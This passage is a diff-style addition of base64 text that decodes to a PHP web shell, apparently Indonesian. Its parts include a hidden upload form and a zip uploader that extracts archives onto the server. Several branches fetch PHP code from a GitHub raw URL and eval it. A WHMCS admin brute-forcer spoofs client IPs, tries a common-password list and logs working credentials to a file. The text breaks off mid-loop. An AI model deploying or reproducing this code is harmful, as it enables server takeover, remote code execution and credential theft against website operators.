+ICd4JyApIDoKCSgoJHgxNzIgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7CgoJLy8gR3JvdXAKCSR4
+MTczIC49ICgoJHgxNzIgJiAweDAwMjApID8gJ3InIDogJy0nKTsKCSR4MTczIC49ICgoJHgxNzIg
+JiAweDAwMTApID8gJ3cnIDogJy0nKTsKCSR4MTczIC49ICgoJHgxNzIgJiAweDAwMDgpID8KCSgo
+JHgxNzIgJiAweDA0MDApID8gJ3MnIDogJ3gnICkgOgoJKCgkeDE3MiAmIDB4MDQwMCkgPyAnUycg
+OiAnLScpKTsKCgkvLyBXb3JsZAoJJHgxNzMgLj0gKCgkeDE3MiAmIDB4MDAwNCkgPyAncicgOiAn
+LScpOwoJJHgxNzMgLj0gKCgkeDE3MiAmIDB4MDAwMikgPyAndycgOiAnLScpOwoJJHgxNzMgLj0g
+KCgkeDE3MiAmIDB4MDAwMSkgPwoJKCgkeDE3MiAmIDB4MDIwMCkgPyAndCcgOiAneCcgKSA6Cgko
+KCR4MTcyICYgMHgwMjAwKSA/ICdUJyA6ICctJykpOwoKCXJldHVybiAkeDE3MzsKCX0KaWYgKCBp
+c3NldCgkX0dFVFsnQ3Jvb3QnXSkgKQp7CmVjaG8gJzx0YWJsZSBzdHlsZT0iQk9SREVSLUNPTExB
+UFNFOiBjb2xsYXBzZSIgY2VsbHNwYWNpbmc9IjAiIGJvcmRlcmNvbG9yZGFyaz0iIzY2NjY2NiIg
+Y2VsbHBhZGRpbmc9IjUiIGhlaWdodD0iMSIgd2lkdGg9IjEwMCUiIGJnY29sb3I9IiMwMDAwMDAi
+IGJvcmRlcmNvbG9ybGlnaHQ9IiNjMGMwYzAiIGJvcmRlcj0iMSI+PHRyPjxhIGJvb2ttYXJrPSJt
+aW5pcGFuZWwiIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsOyBjb2xvcjogIzAwOTkwMDsgZm9u
+dC1mYW1pbHk6IHZlcmRhbmE7IHRleHQtZGVjb3JhdGlvbjogbm9uZSI+PHRkIHdpZHRoPSI1MCUi
+IGhlaWdodD0iMSIgdmFsaWduPSJ0b3AiIHN0eWxlPSJmb250LWZhbWlseTogdmVyZGFuYTsgY29s
+b3I6ICNkOWQ5ZDk7IGZvbnQtc2l6ZTogMTFweCI+PGNlbnRlcj48YnI+PGZvcm0gbWV0aG9kPSJQ
+T1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBu
+YW1lPSJhY3QiIHZhbHVlPSJ1cGxvYWQiIHN0eWxlPSJmb250LXNpemU6IDhwdDsgY29sb3I6ICNG
+RkZGRkY7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMSBzb2xpZCAjNjY2NjY2OyBiYWNr
+Z3JvdW5kLWNvbG9yOiAjMDA5OTAwIj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0idXNlcmZpbGUi
+IHN0eWxlPSJmb250LXNpemU6IDhwdDsgY29sb3I6ICNGRkZGRkY7IGZvbnQtZmFtaWx5OiBUYWhv
+bWE7IGJvcmRlcjogMSBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA5OTAwIj48
+aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJtaW5pZm9ybSIgdmFsdWU9IjEiIHN0eWxlPSJmb250
+LXNpemU6IDhwdDsgY29sb3I6ICNGRkZGRkY7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjog
+MSBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA5OTAwIj48aW5wdXQgdHlwZT0i
+c3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQiIHN0eWxlPSJmb250LXNpemU6IDhw
+dDsgY29sb3I6ICNGRkZGRkY7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMSBzb2xpZCAj
+NjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA5OTAwIj48YnI+PGJyPic7Cn0KewokeDE3NCA9
+ICIiOwokeDE3NSA9ICR4MTc0IC4gYmFzZW5hbWUoJHgyOFsndXNlcmZpbGUnXVsnbmFtZSddKTsK
+aWYgKGlzc2V0KCR4MjhbJ3VzZXJmaWxlJ11bJ25hbWUnXSkpIHsKICAgICAgICBpZiAobW92ZV91
+cGxvYWRlZF9maWxlKCR4MjhbJ3VzZXJmaWxlJ11bJ3RtcF9uYW1lJ10sICR4MTc1KSkgewogICAg
+ICAgICAgICAgICAgZWNobyAiRmlsZW11ICIuIGJhc2VuYW1lKCR4MjhbJ3VzZXJmaWxlJ11bJ25h
+bWUnXSkgLiIgQmVyaGFzaWwgRGl1cGxvYWQgXl9eICI7CiAgICAgICAgfSBlbHNlIHsKICAgICAg
+ICAgICAgICAgIGVjaG8gIk9yYWlzbyBEaXVwbG9hZCBDb29rISI7CiAgICAgICAgfQp9CgplY2hv
+ICc8L2Zvcm0+PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PC9hPic7Cn0KaWYgKCBpc3NldCgk
+X0dFVFsnVWFlWiddKSApCnsKQHNlc3Npb25fc3RhcnQoKTsgCkBlcnJvcl9yZXBvcnRpbmcoMCk7
+IApAaW5pX3NldCgnZXJyb3JfbG9nJyxOVUxMKTsgCkBpbmlfc2V0KCdsb2dfZXJyb3JzJywwKTsg
+CkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLDApOyAKQGluaV9zZXQoJ2Rpc3BsYXlfZXJy
+b3JzJywgMCk7CkBzZXRfdGltZV9saW1pdCgwKTsgCkBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUo
+MCk7IAogICAgZnVuY3Rpb24gcm1kaXJfcmVjdXJzaXZlKCR4MTcwKSB7CiAgICBmb3JlYWNoKHNj
+YW5kaXIoJHgxNzApIGFzICR4MjkpIHsKICAgIGlmICgnLicgPT09ICR4MjkgfHwgJy4uJyA9PT0g
+JHgyOSkgY29udGludWU7CiAgICBpZiAoaXNfZGlyKCIkeDE3MC8keDI5IikpIHJtZGlyX3JlY3Vy
+c2l2ZSgiJHgxNzAvJHgyOSIpOwogICAgZWxzZSB1bmxpbmsoIiR4MTcwLyR4MjkiKTsKICAgIH0K
+ICAgICAKICAgIHJtZGlyKCR4MTcwKTsKICAgIH0KICAgICAKICAgIGlmKCR4MjhbInppcF9maWxl
+Il1bIm5hbWUiXSkgewogICAgJHhiOCA9ICR4MjhbInppcF9maWxlIl1bIm5hbWUiXTsKICAgICR4
+MTc2ID0gJHgyOFsiemlwX2ZpbGUiXVsidG1wX25hbWUiXTsKICAgICR4OWEgPSAkeDI4WyJ6aXBf
+ZmlsZSJdWyJ0eXBlIl07CiAgICAgCiAgICAkeDQ4ID0gZXhwbG9kZSgiLiIsICR4YjgpOwogICAg
+JHgxNzcgPSBhcnJheSgnYXBwbGljYXRpb24vemlwJywgJ2FwcGxpY2F0aW9uL3gtemlwLWNvbXBy
+ZXNzZWQnLCAnbXVsdGlwYXJ0L3gtemlwJywgJ2FwcGxpY2F0aW9uL3gtY29tcHJlc3NlZCcpOwog
+ICAgZm9yZWFjaCgkeDE3NyBhcyAkeDE3OCkgewogICAgaWYoJHgxNzggPT0gJHg5YSkgewogICAg
+JHgxNzkgPSB0cnVlOwogICAgYnJlYWs7CiAgICB9CiAgICB9CiAgICAgCiAgICAkeDE3YSA9IHN0
+cnRvbG93ZXIoJHg0OFsxXSkgPT0gJ3ppcCcgPyB0cnVlIDogZmFsc2U7CiAgICBpZighJHgxN2Ep
+IHsKICAgICR4MTkgPSAiVGhlIGZpbGUgeW91IGFyZSB0cnlpbmcgdG8gdXBsb2FkIGlzIG5vdCBh
+IC56aXAgZmlsZS4gUGxlYXNlIHRyeSBhZ2Fpbi4iOwogICAgfQogICAgIAogICAgLyogUEhQIGN1
+cnJlbnQgcGF0aCAqLwogICAgJHhiNyA9IGRpcm5hbWUoX19GSUxFX18pLicvJzsgLy8gYWJzb2x1
+dGUgcGF0aCB0byB0aGUgZGlyZWN0b3J5IHdoZXJlIHppcHBlci5waHAgaXMgaW4KICAgICR4MTdi
+ID0gYmFzZW5hbWUgKCR4YjgsICcuemlwJyk7IC8vIGFic29sdXRlIHBhdGggdG8gdGhlIGRpcmVj
+dG9yeSB3aGVyZSB6aXBwZXIucGhwIGlzIGluIChsb3dlcmNhc2UpCiAgICAkeDE3YiA9IGJhc2Vu
+YW1lICgkeDE3YiwgJy5aSVAnKTsgLy8gYWJzb2x1dGUgcGF0aCB0byB0aGUgZGlyZWN0b3J5IHdo
+ZXJlIHppcHBlci5waHAgaXMgaW4gKHdoZW4gdXBwZXJjYXNlKQogICAgIAogICAgJHgxN2MgPSAk
+eGI3IC4gJHgxN2I7IC8vIHRhcmdldCBkaXJlY3RvcnkKICAgICR4MTdkID0gJHhiNyAuICR4Yjg7
+IC8vIHRhcmdldCB6aXAgZmlsZQogICAgIAogICAgLyogY3JlYXRlIGRpcmVjdG9yeSBpZiBub3Qg
+ZXhpc3RzJywgb3RoZXJ3aXNlIG92ZXJ3cml0ZSAqLwogICAgLyogdGFyZ2V0IGRpcmVjdG9yeSBp
+cyBzYW1lIGFzIGZpbGVuYW1lIHdpdGhvdXQgZXh0ZW5zaW9uICovCiAgICAgCiAgICBpZiAoaXNf
+ZGlyKCR4MTdjKSkgcm1kaXJfcmVjdXJzaXZlICggJHgxN2MpOwogICAgIAogICAgIAogICAgbWtk
+aXIoJHgxN2MsIDA3NzcpOwogICAgIAogICAgIAogICAgLyogaGVyZSBpdCBpcyByZWFsbHkgaGFw
+cGVuaW5nICovCiAgICAgCiAgICBpZihtb3ZlX3VwbG9hZGVkX2ZpbGUoJHgxNzYsICR4MTdkKSkg
+ewogICAgJHgxN2UgPSBuZXcgWmlwQXJjaGl2ZSgpOwogICAgJHhjMiA9ICR4MTdlLT5vcGVuKCR4
+MTdkKTsgLy8gb3BlbiB0aGUgemlwIGZpbGUgdG8gZXh0cmFjdAogICAgaWYgKCR4YzIgPT09IHRy
+dWUpIHsKICAgICR4MTdlLT5leHRyYWN0VG8oJHgxN2MpOyAvLyBwbGFjZSBpbiB0aGUgZGlyZWN0
+b3J5IHdpdGggc2FtZSBuYW1lCiAgICAkeDE3ZS0+Y2xvc2UoKTsKICAgICAKICAgIHVubGluaygk
+eDE3ZCk7CiAgICB9CiAgICAkeDE5ID0gIkF1dXVnZ2hoaCwuLi4gS29udG9sbXUgVGFudGUgTWFz
+dWtpbiBkaSBEYWxhbSBWYWdpbmEgVGFudGUgQXV1dWdnaGhoLC4uLiAiOwogICAgfSBlbHNlIHsJ
+CiAgICAkeDE5ID0gIk9yYSBJc28gTWxlYnUgQ09LIEtvbnRvbG11IE1hc3VrIEFuZ2luIFBhbGVu
+ZyAiOwogICAgfQogICAgfQogICAgIAogICAgIAoKCmVjaG8gJzxsaW5rIHJlbD0iU0hPUlRDVVQg
+SUNPTiIgaHJlZj0iaHR0cDovL2k0OC5zZXJ2aW1nLmNvbS91L2Y0OC8xNi8wOC8wNy83NC9pbmRv
+bmUxMC5naWYiPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtTGFuZ3VhZ2UiIGNvbnRlbnQ9ImZy
+Ij4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNo
+YXJzZXQ9d2luZG93cy0xMjUyIj4KPGZvbnQgY2xhc3M9ImhrMiIgc3R5bGU9InRleHQtc2hhZG93
+OiAxcHggLTFweCA4cHg7Ij4gCjwhLS1ieSBoYWNrZXIgc2FraXQgaGF0aS0tPiAKPGJvZHkgc3R5
+bGU9ImJhY2tncm91bmQtY29sb3I6IzAwMDAwMDtiYWNrZ3JvdW5kLWltYWdlOnVybChodHRwczov
+L2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vLTRtdTRVZUdyTVo0L1ZubG41aVM5aXlJL0FBQUFB
+QUFBQUxVL3BlR01TS1E4Rm8wL3c4NTktaDQ4My1uLW5vLzU0MTQxOF8xMzA5NDA4MTM3NjM5NDFf
+ODYyNzk3MjE4X24uanBnKTtiYWNrZ3JvdW5kLXJlcGVhdDpuby1yZXBlYXQ7YmFja2dyb3VuZC1w
+b3NpdGlvbjp0b3A7IiBiZ2NvbG9yPSIjMDAwMDAwIj48Y2VudGVyPgo8ZGl2IHN0eWxlPSItbW96
+LWJvcmRlci1yYWRpdXM6IHdlYmtpdC1ib3JkZXItcmFkaXVzOiAxMHB4IDVweCAxMHB4IDVweDsg
+YmFja2dyb3VuZC1jb2xvcjogIzsgYm9yZGVyLXJhZGl1czogMTBweDsgYm9yZGVyOiAxcHggc29s
+aWQgd2hpdGUgOyI+CjxkaXYgc3R5bGU9Ii1tb3otYm9yZGVyLXJhZGl1czogd2Via2l0LWJvcmRl
+ci1yYWRpdXM6IDEwcHggNXB4IDEwcHggNXB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjOyBib3JkZXIt
+cmFkaXVzOiAxMHB4OyBib3JkZXI6IDFweCBzb2xpZCB3aGl0ZSA7Ij4KPHN0eWxlPgpib2R5LHRh
+Ymxle2JhY2tncm91bmQ6ICA7IGZvbnQtZmFtaWx5OlZlcmRhbmEsdGFob21hOyBjb2xvcjogd2hp
+dGUgOyBmb250LXNpemU6MTBweCB9CkE6bGluayB7dGV4dC1kZWNvcmF0aW9uOiBub25lO2NvbG9y
+OiBhcXVhO30KQTphY3RpdmUge3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjogYXF1YTt9CkE6
+dmlzaXRlZCB7dGV4dC1kZWNvcmF0aW9uOiBub25lO2NvbG9yOiBsaW1lO30KQTpob3ZlciB7dGV4
+dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IGNvbG9yOiBGdWNoc2lhO30KI25ldyxpbnB1dCx0YWJs
+ZSx0ZCx0ciwjZ2d7Ym9yZGVyLXN0eWxlOnNvbGlkO3RleHQtZGVjb3JhdGlvbjpib2xkIDt9Cmlu
+cHV0OmhvdmVyLHRyOmhvdmVyLHRkOmhvdmVye2JhY2tncm91bmQtY29sb3I6ICA7IGNvbG9yOiBh
+cXVhO30KPC9zdHlsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYTpsaW5re2NvbG9yOiNm
+ZmZmZmY7dGV4dC1kZWNvcmF0aW9uOm5vbmV9LS0+PC9zdHlsZT4gJzsKe2lmKCR4MTkpIGVjaG8g
+IjxwPiR4MTk8L3A+Ijt9CmVjaG8gJzxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEi
+IG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPjxsYWJlbD5TaWxhaGthbiBNYXN1a2FuIEtvbnRvbCBB
+bmRhIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJ6aXBfZmlsZSIgLz48L2xhYmVsPjxpbnB1dCB0
+eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCIgLz48L2Zvcm0+PC9ib2R5
+PjwvaHRtbD4nOwp9CmlmICggaXNzZXQoJF9HRVRbJ0V4RSddKSApCnsKCiR4MGYgPSAiaHR0cHM6
+Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyL2VtYWls
+Lmh0bWwiOwokeDEwID0gZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+Jy4keDEwKTsK
+Cgp9CmlmICggaXNzZXQoJF9HRVRbJ1BtRSddKSApCnsKCiR4MGYgPSAiaHR0cHM6Ly9yYXcuZ2l0
+aHVidXNlcmNvbnRlbnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyL2V4ZC5waHAiOwokeDEw
+ID0gZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+Jy4keDEwKTsKCgp9CgppZiAoIGlz
+c2V0KCRfR0VUWydTYk4nXSkgKQp7CgokeDBmID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250
+ZW50LmNvbS9hbnRvbmlvbGEvcmVqZWtpL21hc3Rlci82NTI0M3R3YXpmc2RkZDZ1ci5waHAiOwok
+eDEwID0gZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+Jy4keDEwKTsKCgp9CgoJaWYg
+KCBpc3NldCgkX0dFVFsnU21wSyddKSApCnsKCiR4MGYgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNl
+cmNvbnRlbnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyL3NlbXBhay5waHAiOwokeDEwID0g
+ZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+Jy4keDEwKTsKCgp9CmlmICggaXNzZXQo
+JF9HRVRbJ1JtRHMnXSkgKQp7CgokeDBmID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50
+LmNvbS9hbnRvbmlvbGEvcmVqZWtpL21hc3Rlci81MzI3ODc5ODM2NnJtZC5waHAiOwokeDEwID0g
+ZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+Jy4keDEwKTsKCgp9CmlmICggaXNzZXQo
+JF9HRVRbJ1N3UEptUEwnXSkgKQp7CgokeDBmID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250
+ZW50LmNvbS9hbnRvbmlvbGEvcmVqZWtpL21hc3Rlci9hZDQzMjE0MWFzZGZzZGolMjB3cGptYnJ0
+LnBocCI7CiR4MTAgPSBmaWxlX2dldF9jb250ZW50cygkeDBmKTsKZXZhbCgnPz4nLiR4MTApOwoK
+Cn0KaWYgKCBpc3NldCgkX0dFVFsnYmFjayddKSApCnsKCiR4MGYgPSAiaHR0cHM6Ly9yYXcuZ2l0
+aHVidXNlcmNvbnRlbnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyLzc0OTIwOTI4ODIzMTU0
+NmRjbmZkcjM0My5waHAiOwokeDEwID0gZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+
+Jy4keDEwKTsKCgp9CmlmICggaXNzZXQoJF9HRVRbJ1dobWN6MjExJ10pICkKewoKZWNobyAiPGh0
+bWw+PGhlYWQ+PGxpbmsgcmVsPVwiU0hPUlRDVVQgSUNPTlwiIGhyZWY9XCJodHRwOi8vaTQ4LnNl
+cnZpbWcuY29tL3UvZjQ4LzE2LzA4LzA3Lzc0L2luZG9uZTEwLmdpZlwiPjx0aXRsZT4gPi18SXwt
+PiBIc0ggMjAxMSA8LXxJfC08IDwvdGl0bGU+PG1ldGEgaHR0cC1lcXVpdj1cIkNvbnRlbnQtVHlw
+ZVwiIGNvbnRlbnQ9XCJ0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVwiPjxzdHlsZT4gYm9k
+eSx0YWJsZXtiYWNrZ3JvdW5kOiAgOyBmb250LWZhbWlseTpWZXJkYW5hLHRhaG9tYTsgY29sb3I6
+IERhcmt2aW9sZXQgOyBmb250LXNpemU6MTBweCB9IEE6bGluayB7dGV4dC1kZWNvcmF0aW9uOiBu
+b25lO2NvbG9yOiBhcXVhO30gQTphY3RpdmUge3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjog
+YXF1YTt9IEE6dmlzaXRlZCB7dGV4dC1kZWNvcmF0aW9uOiBub25lO2NvbG9yOiBsaW1lO30gQTpo
+b3ZlciB7dGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IGNvbG9yOiBGdWNoc2lhO30gI25ldyxp
+bnB1dCx0YWJsZSx0ZCx0ciwjZ2d7Ym9yZGVyLXN0eWxlOnNvbGlkO3RleHQtZGVjb3JhdGlvbjpi
+b2xkIDt9IGlucHV0OmhvdmVyLHRyOmhvdmVyLHRkOmhvdmVye2JhY2tncm91bmQtY29sb3I6ICA7
+IGNvbG9yOiBhcXVhO30gPC9zdHlsZT48c3R5bGUgdHlwZT1cInRleHQvY3NzXCI+PC9zdHlsZT48
+c3R5bGUgdHlwZT1cInRleHQvY3NzXCI+PC9zdHlsZT48L2hlYWQ+PGNlbnRlcj48Zm9udCBzaXpl
+PVwiN1wiIGNvbG9yPVwiIzAwNzhBQVwiPkhTSCBXSE1DUyBCUlVURSBGT1JDRSAyMDExIDwvZm9u
+dD48L2NlbnRlcj48Y2VudGVyPiAgPGZvcm0gbWV0aG9kPVwicG9zdFwiPiA8Y2VudGVyPiBcbiI7
+IAplY2hvICI8dGV4dGFyZWEgcm93cz0nMTUnIGNvbHM9JzQ1JyBuYW1lPVwic2l0ZVwiPmh0dHA6
+Ly90YXJnZXQuY29tL2FkbWluLzwvdGV4dGFyZWE+XG4iOyAKZWNobyAiPHRleHRhcmVhIHJvd3M9
+JzE1JyBjb2xzPSczMCcgbmFtZT1cInVzZXJcIj5hZG1pbiBcbiI7IAplY2hvICJkZW1vXG4iOyAK
+ZWNobyAiYWRtaW4xMjNcbiI7IAplY2hvICI8L3RleHRhcmVhPjx0ZXh0YXJlYSByb3dzPScxNScg
+Y29scz0nMzAnIG5hbWU9XCJwYXNzXCI+XG4iOyAKZWNobyAiYWRtaW5cbiI7IAplY2hvICIxMjM0
+NTZcbiI7IAplY2hvICJwYXNzd29yZFxuIjsgCmVjaG8gIjEwMjAzMFxuIjsgCmVjaG8gIjEyMzEy
+M1xuIjsgCmVjaG8gIjEyMzQ1XG4iOyAKZWNobyAiMTIzNDU2Nzg5XG4iOyAKZWNobyAicGFzc1xu
+IjsgCmVjaG8gInRlc3RcbiI7IAplY2hvICJhZG1pbjEyM1xuIjsgCmVjaG8gImRlbW9cbiI7IApl
+Y2hvICIhQCMkJV5cbiI7IAplY2hvICI8L3RleHRhcmVhPjxicj48aW5wdXQgdHlwZT1cInN1Ym1p
+dFwiIG5hbWU9J3N0YXJ0JyB2YWx1ZT1cIiBbIFAgTCBBIFkgXSBcIiAvPjwvZm9ybT48L2NlbnRl
+cj5cbiI7CiBzZXRfdGltZV9saW1pdCgwKTsgCiAgICBlcnJvcl9yZXBvcnRpbmcoMCk7IAogICAg
+QGFwYWNoZV9zZXRlbnYoJ25vLWd6aXAnLCAxKTsgCiAgICBAaW5pX3NldCgnemxpYi5vdXRwdXRf
+Y29tcHJlc3Npb24nLCAwKTsgCiAgICBAaW5pX3NldCgnaW1wbGljaXRfZmx1c2gnLCAxKTsgCiAg
+ICBmb3IoJHg4Yz0wOyR4OGM8PSBvYl9nZXRfbGV2ZWwoKTsgJHg4YysrKSAKICAgIHsgCiAgICAg
+ICAgb2JfZW5kX2ZsdXNoKCk7IAogICAgfSAKICAgIG9iX2ltcGxpY2l0X2ZsdXNoKDEpOyAKIGZ1
+bmN0aW9uIGNoZWNrX2lwKCR4MTdmKSB7IAogICAgaWYgKCghZW1wdHkoJHgxN2YpICYmIGlwMmxv
+bmcoJHgxN2YpICE9IDAgLSAxKSAmJiBpcDJsb25nKCR4MTdmKSAhPSBmYWxzZSkgeyAKICAgICAg
+ICAkeDE4MCA9IGFycmF5KGFycmF5KCIwLjAuMC4wIiwgIjIuMjU1LjI1NS4yNTUiKSwgYXJyYXko
+IjEwLjAuMC4wIiwgIjEwLjI1NS4yNTUuMjU1IiksIGFycmF5KCIxMjcuMC4wLjAiLCAiMTI3LjI1
+NS4yNTUuMjU1IiksIGFycmF5KCIxNjkuMjU0LjAuMCIsICIxNjkuMjU0LjI1NS4yNTUiKSwgYXJy
+YXkoIjE3Mi4xNi4wLjAiLCAiMTcyLjMxLjI1NS4yNTUiKSwgYXJyYXkoIjE5Mi4wLjIuMCIsICIx
+OTIuMC4yLjI1NSIpLCBhcnJheSgiMTkyLjE2OC4wLjAiLCAiMTkyLjE2OC4yNTUuMjU1IiksIGFy
+cmF5KCIyNTUuMjU1LjI1NS4wIiwgIjI1NS4yNTUuMjU1LjI1NSIpKTsgCiAgICAgICAgZm9yZWFj
+aCAoJHgxODAgYXMgJHgxMWQpIHsgCiAgICAgICAgICAgICR4MTgxID0gaXAybG9uZygkeDExZFsw
+XSk7IAogICAgICAgICAgICAkeDE4MiA9IGlwMmxvbmcoJHgxMWRbMV0pOyAKCiAgICAgICAgICAg
+IGlmICgkeDE4MSA8PSBpcDJsb25nKCR4MTdmKSAmJiBpcDJsb25nKCR4MTdmKSA8PSAkeDE4Mikg
+eyAKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsgCiAgICAgICAgICAgICAgICBjb250aW51
+ZTsgCiAgICAgICAgICAgIH0gCiAgICAgICAgfSAKCiAgICAgICAgcmV0dXJuIHRydWU7IAogICAg
+fSAKCiAgICByZXR1cm4gZmFsc2U7IAp9IApmdW5jdGlvbiBsb2dpbigkeDBmLCR4MTAyLCR4MTE0
+KXsgCiAgICBnbG9iYWwgJHgxN2Y7IAoKICAgICR4MTgzID0gYXJyYXkoJ3VzZXJuYW1lJz0+JHgx
+MDIsJ3Bhc3N3b3JkJz0+JHgxMTQsJ3JlbWVtYmVybWUnPT4nb24nKTsgCgogICAgJHhmNiA9IGN1
+cmxfaW5pdCgpOyAKICAgIGN1cmxfc2V0b3B0KCR4ZjYsQ1VSTE9QVF9VUkwsIiR4MGYvZG9sb2dp
+bi5waHAiKTsgCiAgICBjdXJsX3NldG9wdCgkeGY2LENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsZmFs
+c2UpOyAKICAgIGN1cmxfc2V0b3B0KCR4ZjYsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUixmYWxzZSk7
+IAogICAgY3VybF9zZXRvcHQoJHhmNixDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLHRydWUpOyAKICAg
+IGN1cmxfc2V0b3B0KCR4ZjYsQ1VSTE9QVF9IVFRQSEVBREVSLGFycmF5KCJDTElFTlQtSVA6ICR4
+MTdmIikpOyAKICAgIGN1cmxfc2V0b3B0KCR4ZjYsQ1VSTE9QVF9VU0VSQUdFTlQsJ01vemlsbGEv
+NS4wIChXaW5kb3dzIE5UIDYuMjsgcnY6MTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xNy4w
+Jyk7IAogICAgY3VybF9zZXRvcHQoJHhmNixDVVJMT1BUX1BPU1QsdHJ1ZSk7IAogICAgY3VybF9z
+ZXRvcHQoJHhmNixDVVJMT1BUX1BPU1RGSUVMRFMsJHgxODMpOyAKICAgIGN1cmxfc2V0b3B0KCR4
+ZjYsQ1VSTE9QVF9IRUFERVIsdHJ1ZSk7IAogICAgY3VybF9zZXRvcHQoJHhmNixDVVJMT1BUX1JF
+RkVSRVIsIiR4MGYvbG9naW4ucGhwIik7IAogICAgJHhlNyA9IGN1cmxfZXhlYygkeGY2KTsgCiAg
+ICBjdXJsX2Nsb3NlKCR4ZjYpOyAKICAgIC8vZWNobyAkeGU3OyAKICAgIGlmKHByZWdfbWF0Y2go
+Jy9Mb2NhdGlvblw6IGluZGV4XC5waHAvJywkeGU3KSl7IAogICAgICAgIHJldHVybiB0cnVlOyAK
+ICAgIH1lbHNleyAKICAgICAgICByZXR1cm4gZmFsc2U7IAogICAgfSAKfSAKaWYoJF9QT1NUWydz
+dGFydCddKXsgCiR4YjI9Zm9wZW4oIkhzSC13aG1jcy50eHQiLCJhKyIpOyAKCgogZm9yZWFjaChl
+eHBsb2RlKCJcbiIsJF9QT1NUWydzaXRlJ10pIGFzICR4ZjQpeyAKICAgJHhmND10cmltKCR4ZjQp
+OyAKZm9yZWFjaChleHBsb2RlKCJcbiIsJF9QT1NUWyd1c2VyJ10pIGFzICR4MTAyKXsgCiAgICAk
+eDEwMiA9IHRyaW0oJHgxMDIpOyAKICAgIGZvcmVhY2goZXhwbG9kZSgiXG4iLCRfUE9TVFsncGFz
+cyddKSBhcyAkeDExNCl7IAogICAgICAgICR4MTE0ID0gdHJpbSgkeDExNCk7IAogICAgICAgIGVj
+aG8gIjxmb250IGNvbG9yPSdsaW1lJz48YnI+U2Nhbm4gJHhmNCB8ICR4MTAyIHwgJHgxMTQ8YnI+
+PC9mb250PiAiOyAKCiAgICAgICAgd2hpbGUgKHRydWUpIHsgCiAgICAgICAgICAgICR4MTdmID0g
+bG9uZzJpcChyYW5kKDExMTExLDk5OTk5OTk5OTk5KSk7IAogICAgICAgICAgICBpZighQGluX2Fy
+cmF5KCR4MTdmLCR4MTg0KSYmY2hlY2tfaXAoJHgxN2YpKXsgCiAgICAgICAgICAgICAgICAkeDE4
+NFtdID0gJHgxN2Y7IAogICAgICAgICAgICAgICAgYnJlYWs7IAogICAgICAgICAgICB9IAogICAg
+ICAgIH0gCgogICAgICAgIGlmKGxvZ2luKCR4ZjQsJHgxMDIsJHgxMTQpKXsgCiAgICAgICAgICAg
+IGVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J2FxdWEnPjxicj5bK10gJHhmNCA8
+YnI+IFsrXXVzZXIgOiAkeDEwMi48YnI+IHBhc3N3b3JkOiR4MTE0XG48YnI+PC9mb250PjwvY2Vu
+dGVyPiI7IAoKICAgICAgICAgICAgZndyaXRlKCR4YjIsIlRhcmdldCA6ICR4ZjRcclxuVXNlcm5h
+bWUgOiAkeDEwMlxyXG5QYXNzd29yZCA6ICR4MTE0XHJcbj09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09XHJcbiIpOyAKICAgICAgICAgICAgYnJlYWs7IAogICAgICAgIH1lbHNleyAK
